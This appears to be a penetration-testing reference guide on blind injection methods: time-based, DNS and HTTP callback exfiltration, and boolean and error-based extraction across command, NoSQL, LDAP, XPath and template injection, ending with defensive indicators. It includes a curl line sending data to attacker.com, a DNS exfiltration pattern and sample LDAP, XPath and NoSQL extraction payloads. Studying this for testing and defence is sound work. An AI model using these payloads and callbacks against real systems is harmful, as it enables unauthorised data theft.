# Blind Injection Techniques Guide

> Reference guide for blind injection exploitation approaches

---

## Overview

**Blind injection** occurs when application is vulnerable but doesn't display results directly.

**Data extraction must occur via side channels**:
- Response time delays
- DNS queries
- HTTP callbacks
- Error message differences
- Boolean response patterns

**Common blind contexts**:
- Command injection with suppressed output
- SQL injection with error suppression
- NoSQL $where without echo
- LDAP injection (authentication only)
- XPath injection (boolean responses only)

---

## 1. Time-Based Blind Injection

### 1.1 Concept

**Method**: Introduce command delays to confirm code execution.

**Confirmation**: Measure response time to detect injected delay.

**Limitation**: Subject to network latency, server load, and timeout policies.

### 1.2 OS Command Injection - Time-Based

**Linux approach**:
- Use sleep command with fixed delay
- Vary delay values to confirm causality

**Windows approach**:
- timeout command
- Ping localhost with packet count

**Cross-platform**:
- Both approaches testable depending on target OS

**Tool**: `commix` with time-based detection, manual timing via curl/Burp.

### 1.3 NoSQL (MongoDB) - Time-Based

**JavaScript eval context**: $where clause accepts sleep(milliseconds).

**Confirmation**: Response delay indicates successful injection.

**Tool**: `nosqlmap` for automated detection.

### 1.4 XPath - Time-Based

**Limitation**: Limited time-based functions in XPath.

**Workaround**: Use other blind techniques (boolean response analysis).

---

## 2. DNS Exfiltration

### 2.1 Concept

**Method**: Command output encoded in DNS queries to attacker's DNS server.

**Confirmation**: Check DNS server logs for query from target.

**Advantage**: Works across network boundaries, bypasses HTTP filtering.

**Limitation**: Requires attacker-controlled DNS server or public service.

### 2.2 OS Command Injection - DNS Exfil

**Approach**: Execute nslookup/dig with command output in subdomain.

**Example concept**: Subdomain = `base64(command_output).attacker.com`.

**Tool**: `commix` for automated generation, Burp Collaborator for callback service.

### 2.3 SSTI - DNS Exfil

**Approach**: Template payload executes command, exfiltrates via DNS.

**Tool**: `tplmap` with out-of-band detection.

### 2.4 DNS Service Options

**Burp Collaborator**: Built into Burp Suite, tracks DNS queries automatically.

**interact.sh**: Free public DNS callback service.

**Custom DNS**: Run own authoritative nameserver for full control.

---

## 3. HTTP Callback Methods

### 3.1 Concept

**Method**: Command output sent to attacker's HTTP server via curl/wget.

**Confirmation**: Check HTTP server logs for incoming request with data.

**Advantage**: Easy setup with publicly available services, full data exfiltration.

**Limitation**: HTTP traffic may be logged/monitored, egress restrictions apply.

### 3.2 OS Command Injection - HTTP Callback

**Approach**: Use curl/wget to POST command output to callback service.

**Example concept**: `curl http://attacker.com/?data=$(base64_encoded_output)`.

**Tool**: `commix` for automated generation.

### 3.3 SSTI - HTTP Callback

**Approach**: Template payload makes HTTP request with exfiltrated data.

**Tool**: `tplmap` with OOB callbacks.

### 3.4 HTTP Service Options

**webhook.site**: Free public service, simple web interface to view requests.

**Burp Collaborator**: Built-in, tracks HTTP requests automatically.

**Custom HTTP listener**: Python http.server, Node.js express, netcat.

---

## 4. Boolean-Based Blind Injection

### 4.1 Concept

**Method**: Infer data through response differences (success vs. error).

**Confirmation**: Different responses indicate condition truth value.

**Approach**: Binary search to determine each character.

### 4.2 LDAP Blind Injection

**Concept**: Inject filter logic that evaluates differently based on data.

**Example**: `admin)(|(surname=a*` succeeds if surname starts with "a", fails otherwise.

**Binary search**: Test prefixes to narrow down first character, repeat for each position.

**Tool**: Manual scripting, `ldapsearch` for testing.

### 4.3 XPath Blind Injection

**Concept**: Use XPath functions to test conditions (substring, starts-with, contains).

**Example**: `' and substring(//user[1]/password,1,1)='a' or '1'='2` evaluates based on first password character.

**Binary search**: Test each position/character combination.

**Tool**: Manual scripting.

### 4.4 NoSQL Blind Injection

**Concept**: Operator injection returns different results for true vs. false conditions.

**Example**: `{"username": {"$regex": "^admin"}, "password": {"$ne": null}}` succeeds if username starts with "admin".

**Enumeration**: Test each character systematically.

**Tool**: `nosqlmap` for automated enumeration.

---

## 5. Error-Based Blind Injection

### 5.1 Concept

**Method**: Infer data from error message generation patterns.

**Confirmation**: Error presence/absence indicates condition truth.

**Limitation**: Requires application to generate distinguishable errors.

### 5.2 LDAP Error-Based

**Approach**: Different filter structures generate different errors.

**Example**: Valid filter vs. syntax error → error message differs.

**Analysis**: Parse error types to infer data structure.

### 5.3 NoSQL Error-Based

**Approach**: Invalid operators/types generate JavaScript errors.

**Example**: Type mismatch in $where → error message leaks type info.

**Analysis**: Infer data types from errors.

---

## 6. Combined Blind Techniques

### 6.1 Time + Data Encoding

**Approach**: Combine time-based confirmation with DNS/HTTP exfil for efficiency.

1. Confirm injection via time delay
2. Execute command and encode output
3. Exfiltrate via DNS or HTTP
4. Decode and analyze results

**Benefit**: Faster than character-by-character extraction.

### 6.2 Boolean + Error Analysis

**Approach**: Use both boolean responses and error messages for redundancy.

**Benefit**: More robust against response filtering.

---

## 7. Automated Blind Injection Tools

**commix**: Automated time-based, DNS, and HTTP callback detection for command injection.

**nosqlmap**: Automated blind injection extraction for NoSQL databases.

**tplmap**: Time-based and OOB detection for SSTI.

**sqlmap**: SQL injection with multiple blind techniques (can extend to NoSQL).

**Burp Suite**: Manual testing with Collaborator for callback-based blind exploitation.

---

## 8. Blind Exploitation Workflow

### Phase 1: Confirm Injection

1. Send detection payload (time delay or callback marker)
2. Observe confirmation (timing change or log entry)
3. Confirm causality (payload influences response)

### Phase 2: Select Extraction Method

1. **Time-based**: Slow but reliable
2. **Boolean-based**: Faster if response differences clear
3. **Callback-based**: Fastest, requires egress

### Phase 3: Data Extraction

1. For time-based: Measure each request delay
2. For boolean-based: Binary search character values
3. For callback-based: Parse exfiltrated data

### Phase 4: Automate

1. Write script for chosen method
2. Iterate over data positions
3. Combine results into complete output

**Tool**: Use automated tools (`commix`, `nosqlmap`, `tplmap`) to accelerate extraction.

---

## 9. Defensive Indicators

**Blind injection indicators**:
- Unusual response time variations
- DNS queries with suspicious subdomain patterns
- Outbound HTTP requests to unfamiliar destinations
- Repeated requests with systematic payload variations

**Logging signals**:
- Time delays in application logs
- Multiple authentication failures
- Malformed filter/query structures
- Out-of-band request patterns

---

*This guide provides reference material for blind injection testing approaches. Actual exploitation uses tools like commix, nosqlmap, tplmap, and Burp Suite.*
